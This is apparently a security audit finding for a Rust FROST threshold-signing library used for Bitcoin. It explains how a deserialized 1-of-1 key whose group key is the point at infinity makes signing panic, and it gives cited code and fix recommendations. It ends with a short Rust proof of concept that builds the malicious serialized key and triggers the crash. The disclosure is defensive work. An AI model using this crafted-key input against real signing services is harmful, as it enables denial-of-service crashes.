### Title
Panic on signing with deserialized identity group key - (File: `networks/bitcoin/src/crypto.rs`)

### Summary
`ThresholdKeys::read` accepts a canonical identity verification share and a zero secret share for a `1-of-1` Lagrange threshold key, producing a `ThresholdKeys` whose derived group key is the point at infinity. When the Bitcoin FROST `Schnorr` algorithm signs with those keys, `Hram::hram` calls `x(A)`, which unconditionally unwraps the x-coordinate and panics because `A` is infinity. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`ThresholdKeys::read` parses the interpolation mode, secret share, and `n` verification shares, then constructs `ThresholdKeys`. [4](#0-3) [5](#0-4) 

Point deserialization rejects non-canonical encodings but does not reject the identity point. [6](#0-5) 

For `t = n = i = 1` and Lagrange interpolation, the interpolation factor is `1`, so a single identity verification share makes `group_key` equal to the identity. [7](#0-6) [2](#0-1) 

During signing, `Schnorr::sign_share` computes the challenge using the aggregated nonce and `params.group_key()`. [8](#0-7) 

The Bitcoin challenge function calls `x(A)`, and `x` panics on infinity because `encoded.x()` is `None`. [9](#0-8) [10](#0-9) 

### Impact Explanation
A process that accepts serialized `ThresholdKeys` from an untrusted source and uses them for Bitcoin FROST signing can be forced into a deterministic panic. This crashes the signing operation and, if the panic is not isolated, the hosting process. [10](#0-9) [11](#0-10) 

### Likelihood Explanation
The malicious input is short and deterministic: a serialized `1-of-1` key with Lagrange interpolation, a zero secret share, and one identity verification share. No race condition, malformed-length field, probability, or privileged access is required once attacker-controlled bytes reach `ThresholdKeys::read` and the resulting keys are used to sign. [12](#0-11) 

### Recommendation
Reject threshold keys whose derived `group_key` is identity, at least for ciphersuites/algorithms requiring non-infinity public keys. For Bitcoin FROST specifically, `sign_share` should return a `FrostError` rather than panic when `group_key` or the aggregate nonce is infinity. Deserialization should also verify that the supplied secret share corresponds to its own verification share before accepting the key object. [13](#0-12) [14](#0-13) 

### Proof of Concept
```rust
use std::collections::HashMap;

use k256::{ProjectivePoint, Scalar};
use rand_core::OsRng;
use zeroize::Zeroizing;

use frost::{
  curve::Secp256k1,
  sign::{AlgorithmMachine, PreprocessMachine, SignMachine},
};
use dkg::{Participant, ThresholdParams, ThresholdKeys, Interpolation};
use bitcoin_serai::crypto::Schnorr;

// Build a semantically usable-by-this-code, but Bitcoin-invalid, key.
let params = ThresholdParams::new(
  1,
  1,
  Participant::new(1).unwrap(),
).unwrap();

let mut shares = HashMap::new();
shares.insert(
  Participant::new(1).unwrap(),
  ProjectivePoint::IDENTITY,
);

let keys = ThresholdKeys::<Secp256k1>::new(
  params,
  Interpolation::Lagrange,
  Zeroizing::new(Scalar::ZERO),
  shares,
).unwrap();

// Prove this state is reachable through the public deserializer.
let encoded = keys.serialize();
let decoded =
  ThresholdKeys::<Secp256k1>::read(&mut encoded.as_slice()).unwrap();

let machine = AlgorithmMachine::new(Schnorr::new(), decoded);
let (sign_machine, _our_preprocess) = machine.preprocess(&mut OsRng);

// For t = 1, no remote preprocesses are needed.
// Panics inside x(A): A is decoded.group_key() == infinity.
let _ = sign_machine.sign(HashMap::new(), b"attacker-controlled-message");
```

### Citations

**File:** crypto/ciphersuite/src/lib.rs (L95-100)
```rust
    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/dkg/src/lib.rs (L230-247)
```rust
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L444-447)
```rust
  /// Return the group key, with the expected linear combination taken.
  pub fn group_key(&self) -> C::G {
    (self.core.group_key * self.scalar) + (C::generator() * self.offset)
  }
```

**File:** crypto/dkg/src/lib.rs (L591-629)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
```

**File:** networks/bitcoin/src/crypto.rs (L13-15)
```rust
fn x(key: &ProjectivePoint) -> [u8; 32] {
  let encoded = key.to_encoded_point(true);
  (*encoded.x().expect("point at infinity")).into()
```

**File:** networks/bitcoin/src/crypto.rs (L59-67)
```rust
    fn hram(R: &ProjectivePoint, A: &ProjectivePoint, m: &[u8]) -> Scalar {
      const TAG_HASH: Sha256 = Sha256::const_hash(b"BIP0340/challenge");

      let mut data = Sha256::engine();
      data.input(TAG_HASH.as_ref());
      data.input(TAG_HASH.as_ref());
      data.input(&x(R));
      data.input(&x(A));
      data.input(m);
```

**File:** networks/bitcoin/src/crypto.rs (L128-149)
```rust
    fn sign_share(
      &mut self,
      params: &ThresholdView<Secp256k1>,
      nonce_sums: &[Vec<<Secp256k1 as Ciphersuite>::G>],
      nonces: Vec<Zeroizing<<Secp256k1 as Ciphersuite>::F>>,
      msg: &[u8],
    ) -> <Secp256k1 as Ciphersuite>::F {
      self.0.sign_share(params, nonce_sums, nonces, msg)
    }

    #[must_use]
    fn verify(
      &self,
      group_key: ProjectivePoint,
      nonces: &[Vec<ProjectivePoint>],
      sum: Scalar,
    ) -> Option<Self::Signature> {
      self.0.verify(group_key, nonces, sum).map(|mut sig| {
        sig.s = <_>::conditional_select(&sum, &-sum, needs_negation(&sig.R));
        // Convert to a Bitcoin signature by dropping the byte for the point's sign bit
        sig.serialize()[1 ..].try_into().unwrap()
      })
```

**File:** crypto/frost/src/algorithm.rs (L201-210)
```rust
  fn sign_share(
    &mut self,
    params: &ThresholdView<C>,
    nonce_sums: &[Vec<C::G>],
    mut nonces: Vec<Zeroizing<C::F>>,
    msg: &[u8],
  ) -> C::F {
    let c = H::hram(&nonce_sums[0][0], &params.group_key(), msg);
    self.c = Some(c);
    SchnorrSignature::<C>::sign(params.secret_share(), nonces.swap_remove(0), c).s
```

**File:** crypto/frost/src/sign.rs (L283-312)
```rust
  fn sign(
    mut self,
    mut preprocesses: HashMap<Participant, Preprocess<C, A::Addendum>>,
    msg: &[u8],
  ) -> Result<(Self::SignatureMachine, SignatureShare<C>), FrostError> {
    let multisig_params = self.params.multisig_params();

    let mut included = Vec::with_capacity(preprocesses.len() + 1);
    included.push(multisig_params.i());
    for l in preprocesses.keys() {
      included.push(*l);
    }
    included.sort_unstable();

    // Included < threshold
    if included.len() < usize::from(multisig_params.t()) {
      Err(FrostError::InvalidSigningSet("not enough signers"))?;
    }
    // OOB index
    if u16::from(included[included.len() - 1]) > multisig_params.n() {
      Err(FrostError::InvalidParticipant(multisig_params.n(), included[included.len() - 1]))?;
    }
    // Same signer included multiple times
    for i in 0 .. (included.len() - 1) {
      if included[i] == included[i + 1] {
        Err(FrostError::DuplicatedParticipant(included[i]))?;
      }
    }

    let view = self.params.keys.view(included.clone()).unwrap();
```
